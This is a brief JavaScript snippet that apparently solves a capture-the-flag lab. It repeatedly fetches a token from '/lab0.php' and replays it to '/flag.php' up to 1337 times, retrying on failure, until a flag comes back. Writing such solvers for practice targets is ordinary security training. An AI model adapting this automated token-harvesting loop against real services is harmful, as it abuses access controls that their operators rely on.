(async function() {
  for (let i = 1; i <= 1337; i++) {
    let t = await (await fetch('/lab0.php')).text();
    let m = t.match(/token=([a-f0-9]+)/);
    if (!m) { 
      console.log('fail: ' + i); 
      i--; 
      await new Promise(r => setTimeout(r, 2000)); 
      continue; 
    }
    let r = await (await fetch('/flag.php?token=' + m[1])).text();
    if (r !== 'wrong token' && !r.startsWith('One more time')) {
      alert('FLAG: ' + r);
      return;
    }
    if (i % 100 === 0) console.log(i + '/1337');
  }
})();